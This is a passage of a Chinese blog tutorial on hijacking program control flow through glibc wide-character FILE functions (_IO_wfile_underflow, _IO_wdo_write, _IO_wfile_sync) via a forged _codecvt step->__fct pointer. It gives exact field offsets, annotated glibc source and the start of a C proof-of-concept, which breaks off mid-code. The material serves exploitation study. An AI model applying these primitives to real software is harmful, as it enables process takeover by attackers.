title="利用_IO_wfile_underflow函数控制程序执行流"></a>利用_IO_wfile_underflow函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p><ul><li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li><li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow</span><br><span class="line">    __libio_codecvt_in</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure><h3 id="利用-IO-wfile-underflow-mmap函数控制程序执行流-1"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流-1" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用_IO_wfile_underflow_mmap函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p><ul><li><code>_flags</code>设置为<code>~4</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li><li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为非<code>0</code>，即满足<code>*(A + 0x30) != 0</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    __libio_codecvt_in</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure><p>详细分析如下：<br>看<code>_IO_wfile_underflow_mmap</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">              &amp;read_stop,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code>不进入调用</p><h3 id="利用-IO-wdo-write函数控制程序执行流"><a href="#利用-IO-wdo-write函数控制程序执行流" class="headerlink" title="利用_IO_wdo_write函数控制程序执行流"></a>利用_IO_wdo_write函数控制程序执行流</h3><p><code>IO_wdo_write</code>的调用点很多，这里选择一个相对简单的链：</p><p>对<code>fp</code>的设置如下：</p><ul><li><code>vtable</code>设置为<code>_IO_file_jumps/</code>地址（加减偏移），使其能成功调用<code>_IO_new_file_sync</code>即可</li><li><code>_IO_write_ptr &gt; _IO_write_base</code>，即满足<code>*(fp + 0x28) &gt; *(fp + 0x20)</code></li><li><code>_mode &gt; 0</code>，即满足<code>(fp + 0xc0) &gt; 0</code></li><li><code>_IO_write_end != _IO_write_ptr</code>或者<code>_IO_write_end == _IO_write_base</code>，即满足<code>*(fp + 0x30) != *(fp + 0x28)</code>或者<code>*(fp + 0x30) == *(fp + 0x20)</code></li><li><code>_wide_data</code>设置为堆地址，假设地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt;= *(A + 0x18)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_out.step</code>设置为可控堆地址<code>C</code>，即满足<code>*(B + 0x38) = C</code></li><li><code>codecvt-&gt;__cd_out.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_out.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_sync</span><br><span class="line">    _IO_do_flush</span><br><span class="line">        _IO_wdo_write</span><br><span class="line">          __libio_codecvt_out</span><br><span class="line">              DL_CALL_FCT</span><br><span class="line">                  gs = fp-&gt;_codecvt-&gt;__cd_out.step</span><br><span class="line">                  *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure><p>详细分析如下：<br>首先看<code>_IO_new_file_sync</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;<span class="comment">//调用到这里</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要满足<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>。</p><p>然后看<code>_IO_do_flush</code>宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0                                  \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \</span></span><br><span class="line"><span class="meta">           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \</span></span><br><span class="line"><span class="meta">            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><p>根据<code>fp-&gt;_mode</code>的值选择调用<code>_IO_do_write</code>或者<code>_IO_wdo_write</code>。这里我们要调用后者，必须使<code>fp-&gt;_mode &gt; 0</code>。此时的第二个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_base</code>，第三个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base</code>。</p><p>接着看<code>_IO_wdo_write</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_wdo_write (FILE *fp, <span class="type">const</span> <span class="type">wchar_t</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 第三个参数必须要大于0</span></span><br><span class="line">  <span class="keyword">if</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr</span><br><span class="line">      &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;<span class="comment">// 不能进入这个分支</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_new_do_write (fp, fp-&gt;_IO_write_base,</span><br><span class="line">                fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Now convert from the internal format into the external buffer.  */</span></span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">      result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                    data, data + to_do, &amp;new_data,</span><br><span class="line">                    write_ptr,</span><br><span class="line">                    buf_end,</span><br><span class="line">                    &amp;write_ptr);</span><br><span class="line">          <span class="comment">//......</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先<code>to_do</code>必须要大于<code>0</code>，即满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>，然后这个判断需要为假<code>fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base</code>。</p><p>这个链基本需要控制<code>fp-&gt;_wide_data</code>，相比上两条链的约束条件要更多一点。</p><h3 id="使用-IO-wfile-sync函数控制程序执行流"><a href="#使用-IO-wfile-sync函数控制程序执行流" class="headerlink" title="使用_IO_wfile_sync函数控制程序执行流"></a>使用_IO_wfile_sync函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p><ul><li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_sync</code>即可</li><li><code>_wide_data</code>设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &lt;= *(A + 0x18)</code></li><li><code>_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end</code>，即满足<code>*A != *(A + 8)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__stateful</code>设置为非<code>0</code>，即满足<code>*(B + 0x58) != 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>rsi</code>为<code>&amp;codecvt-&gt;__cd_in.step_data</code>可控。</li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_sync</span><br><span class="line">    __libio_codecvt_length</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure><p>详细分析如下：<br>直接看<code>_IO_wfile_sync</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">wint_t</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="comment">// 不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (fp))</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  <span class="comment">// 需要进入到这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out how many bytes we have to go back in the</span></span><br><span class="line"><span class="comment">     external buffer.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line">      <span class="type">off64_t</span> new_pos;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 这里直接返回-1即可</span></span><br><span class="line">      <span class="type">int</span> clen = __libio_codecvt_encoding (cv);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (clen &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* It is easy, a fixed number of input bytes are used for each</span></span><br><span class="line"><span class="comment">       wide character.  */</span></span><br><span class="line">    delta *= clen;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out the hard way how much to back off.</span></span><br><span class="line"><span class="comment">         To do this we determine how much input we needed to</span></span><br><span class="line"><span class="comment">         generate the wide characters up to the current reading</span></span><br><span class="line"><span class="comment">         position.  */</span></span><br><span class="line">      <span class="type">int</span> nread;</span><br><span class="line">      <span class="type">size_t</span> wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr</span><br><span class="line">               - fp-&gt;_wide_data-&gt;_IO_read_base);</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;</span><br><span class="line">    <span class="comment">// 调用到这里</span></span><br><span class="line">      nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                      fp-&gt;_IO_read_base,</span><br><span class="line">                      fp-&gt;_IO_read_end, wnread);</span><br><span class="line">            <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base</code>和<code>fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0</code>。</p><p>然后看下<code>__libio_codecvt_encoding</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libio_codecvt_encoding (<span class="keyword">struct</span> _IO_codecvt *codecvt)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* See whether the encoding is stateful.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__stateful)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">/* Fortunately not.  Now determine the input bytes for the conversion</span></span><br><span class="line"><span class="comment">     necessary for each wide character.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__min_needed_from</span><br><span class="line">      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)</span><br><span class="line">    <span class="comment">/* Not a constant value.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> codecvt-&gt;__cd_in.step-&gt;__min_needed_from;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接设置<code>fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0</code>即可返回<code>-1</code>。</p><h2 id="示例-6"><a href="#示例-6" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m[!] Backdoor is called!\n&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *)puts_addr);</span><br><span class="line">    <span class="type">size_t</span> libc_base_addr = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="type">void</span> *)libc_base_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x1ed5c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_wfile_jumps_addr = libc_base_addr + <span 